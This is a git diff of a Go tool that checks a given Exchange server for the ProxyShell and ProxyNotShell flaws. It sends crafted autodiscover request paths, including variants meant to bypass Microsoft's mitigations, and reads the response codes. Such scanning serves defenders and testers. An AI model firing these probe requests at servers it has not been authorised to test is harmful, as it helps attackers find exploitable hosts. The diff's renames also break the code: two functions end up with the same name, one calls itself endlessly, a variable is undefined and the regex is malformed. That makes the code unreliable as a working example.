@@ -8,19 +8,20 @@
 // use the combination of these two vulnerabilities to elevate privileges and execute arbitrary code 
 // on the target Exchange server.
 
+// PROCESS:
 // User provides an URL. Go code checks if the URL is valid.
 // First: Make request to the vulnerable resource.
 // Checks: 
-// If resp is 302 it will return ProxyShell.
-// If resp is 200 it will return ProxyNotShell
+// If response is 302 it will return ProxyShell.
+// If response is 200 it will return ProxyNotShell
 // Second: Make the secound requests to the vulnerable resource.
 // Checks: 
-// If resp is 302 it will return ProxyShell & Bypass mitigation.
-// If resp is 200 it will return ProxyNotShell & Bypass mitigation.
+// If response is 302 it will return ProxyShell & Bypass mitigation.
+// If response is 200 it will return ProxyNotShell & Bypass mitigation.
 // Third: Make the third requests to the vulnerable resource.
 // Checks:
-// If resp is 302 it will return ProxyShell.
-// If resp is 200 it will return ProxyNotShell
+// If response is 302 it will return ProxyShell.
+// If response is 200 it will return ProxyNotShell
 
 package main
 
@@ -34,9 +35,9 @@ import (
 	"strings"
 )
 
-// Passing the user input URL to the function. Adding 'http://' if it wasn't provided returning the // clean and checked URL - otherwise "error"
+// Passing the user input URL to the function. Adding 'http://' if it wasn't provided returning the clean and checked URL - otherwise "error"
 
-func checkURL(u string) string {
+func URLChecks(u string) string {
 	re := regexp.MustCompile(`^(?:(http|ftp)s?:\/\/)*(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|*(localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/?|[/?]\S+)$`)
 	if re.MatchString(u) {
 		return u
@@ -47,8 +48,8 @@ func checkURL(u string) string {
 	return u
 }
 
-func checkUrl(u string) string {
-	return re.ReplaceAllStringFunc(checkURL(u), strings.ToLower)
+func URLChecks(u string) string {
+	return re.ReplaceAllStringFunc(URLChecks(u), strings.ToLower)
 }
 
 func main() {
@@ -63,7 +64,7 @@ func main() {
 	}
 	header := make(http.Header)
 	header.Add("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0")
-	req, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
+	req, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", URLChecks(valter), "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
 	req.Header = header
 	client := &http.Client{}
 	resp, _ := client.Do(req)
@@ -111,7 +112,7 @@ func main() {
 	}
 
 	// Request 1 bypass
-	reqb1, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
+	reqb1, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", URLChecks(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell"), nil)
 	reqb1.Header = header
 	clientb1 := &http.Client{}
 	respb1, _ := clientb1.Do(reqb1)
@@ -159,7 +160,7 @@ func main() {
 	}
 
 	// Request 2 bypass
-	reqb2, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", checkUrl(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"), nil)
+	reqb2, _ := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", URLChecks(valter), "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"), nil)
 	reqb2.Header = header
 	clientb2 := &http.Client{}
 	respb2, _ := clientb2.Do(reqb2)
